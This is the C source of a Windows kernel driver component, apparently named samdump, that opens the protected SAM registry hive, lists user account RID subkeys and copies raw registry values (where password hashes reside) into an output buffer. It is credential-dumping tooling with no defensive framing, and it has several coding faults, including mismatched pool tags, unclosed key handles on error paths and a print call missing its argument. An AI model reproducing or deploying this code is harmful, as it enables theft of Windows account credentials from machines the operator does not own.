#include "samdump.h"

ULONG retrieveSpecificValue(PUCHAR report, ULONG offset, ULONG dwSize, PWSTR baseKey, PWSTR keyName)
{
	OBJECT_ATTRIBUTES vName;
	UNICODE_STRING vPath, fName;
	NTSTATUS stat;
	HANDLE key;
	PVOID data;
	WCHAR temp[MAX_PATH];
	ULONG size, returnVal, baseKeyLen;
	PKEY_VALUE_FULL_INFORMATION  value;
	
	if(RtlStringCchLengthW(baseKey, MAX_PATH, &baseKeyLen) != STATUS_SUCCESS)
	{
		DbgPrint("baseKeyLen is too long\n");
		return 0;	
	}
	baseKeyLen++;
	if(baseKeyLen > (MAX_PATH-1) )
	{
		DbgPrint("baseKeyLen is too long\n");
		return 0;	
	}
	
	RtlCopyMemory(temp, baseKey, (baseKeyLen) * sizeof(WCHAR));
	RtlInitUnicodeString(&vPath, temp);
	RtlInitUnicodeString(&fName, keyName);
	RtlZeroMemory(report, dwSize);
	
	DbgPrint("Retrieving %S :: %S\n", vPath.Buffer, fName.Buffer);
	InitializeObjectAttributes(&vName, &vPath,  OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	
	stat=ZwOpenKey(&key, KEY_READ, &vName);
	if(stat != STATUS_SUCCESS )
	{
		DbgPrint("Could not open the %S key : %x\n", baseKey, stat);
		return 0;	
	}
	
	stat = ZwQueryValueKey(key, &fName, KeyValueFullInformation, NULL, 0, &size);
	data = ExAllocatePoolWithTag(PagedPool, size, 'coni');
	if(data == NULL)
	{
		DbgPrint("Cannot allocate pool.\n");
		return 0;
	}
	stat = ZwQueryValueKey(key, &fName, KeyValueFullInformation, data, size, &size);
	if(stat != STATUS_SUCCESS)
	{
		ExFreePoolWithTag(data, 'coni');
		DbgPrint("Cannot query the %S value\n", keyName);
		return 0;
	}
	
	value = (PKEY_VALUE_FULL_INFORMATION ) data;
	
	//DbgPrint("Value len = 0x%x\n", value->DataLength);
	if(value->DataLength > dwSize - offset)
	{
		ExFreePoolWithTag(data, 'samd');
		DbgPrint("The %S value is too long !\n", keyName);
		return 0;
	}
	
	RtlCopyMemory((report + offset), ((PUCHAR)data + value->DataOffset), value->DataLength);
	returnVal = value->DataLength;
	
	ExFreePoolWithTag(data, 'samd');
	
	return returnVal;
	
}

NTSTATUS retrieveRID(PWSTR report, ULONG dwSize)
{
	OBJECT_ATTRIBUTES vName;
	UNICODE_STRING vPath;
	HANDLE key;
	ULONG size;
	NTSTATUS stat;
	ULONG nbSubKeys;
	ULONG currentSubKey;
	KEY_FULL_INFORMATION keyInfo;
	PKEY_NODE_INFORMATION subKeyName;
	PVOID data;
	WCHAR currentName[260];
	
	//DbgPrint("IRQL : 0x%x\n", KeGetCurrentIrql()); // MUST be 0 == PASSIVE_LEVEL
	RtlInitUnicodeString(&vPath, L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users");
	InitializeObjectAttributes(&vName, &vPath,  OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	
	stat=ZwOpenKey(&key, KEY_READ, &vName);
	if(stat != STATUS_SUCCESS )
	{
		DbgPrint("Could not open the \\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users key : %x\n", stat);
		return 1;	
	}
	
	stat=ZwQueryKey(key, KeyFullInformation, &keyInfo, sizeof(keyInfo), &size);
	if(stat != STATUS_SUCCESS)
	{
		DbgPrint("Cannot query the key : %x\n", stat);
		return 1;	
	}
	nbSubKeys = keyInfo.SubKeys;
	
	//DbgPrint("There are %i subkeys\n", nbSubKeys);
	for(currentSubKey = 0; currentSubKey < nbSubKeys; currentSubKey ++)
	{
		stat=ZwEnumerateKey(key, currentSubKey, KeyNodeInformation, NULL, 0, &size);
		data = ExAllocatePoolWithTag(PagedPool, size, 'samd');
		if(data == NULL)
		{
			DbgPrint("Cannot allocate pool.\n");
			return 0;
		}
		stat=ZwEnumerateKey(key, currentSubKey, KeyNodeInformation, data, size, &size);
		
		if(stat != STATUS_SUCCESS)
		{
			DbgPrint("Cannot query the %i subkey\n", currentSubKey);
			ExFreePoolWithTag(data, 'samd');
			return 1;
		}
		
		subKeyName = (PKEY_NODE_INFORMATION)data;
		if(subKeyName->NameLength >= 259)
		{
			DbgPrint("The %i subkey has a too long name !\n");
		}
		else
		{
			RtlZeroMemory(currentName, 260*sizeof(WCHAR));
			RtlCopyMemory(currentName, subKeyName->Name, subKeyName->NameLength);
			*(PWCHAR)((PUCHAR)currentName+subKeyName->NameLength)=L'\n';
			
			DbgPrint("SubKey : %S", currentName);
			if(RtlStringCchCatW(report, dwSize, currentName) != STATUS_SUCCESS)
			{
				DbgPrint("Error : RtlStringCchCat\n");
				ExFreePoolWithTag(data, 'samd');
				return 1;
			}
		}
		
		ExFreePoolWithTag(data, 'samd');
	}
	
	ZwClose(key);
	return STATUS_SUCCESS;
}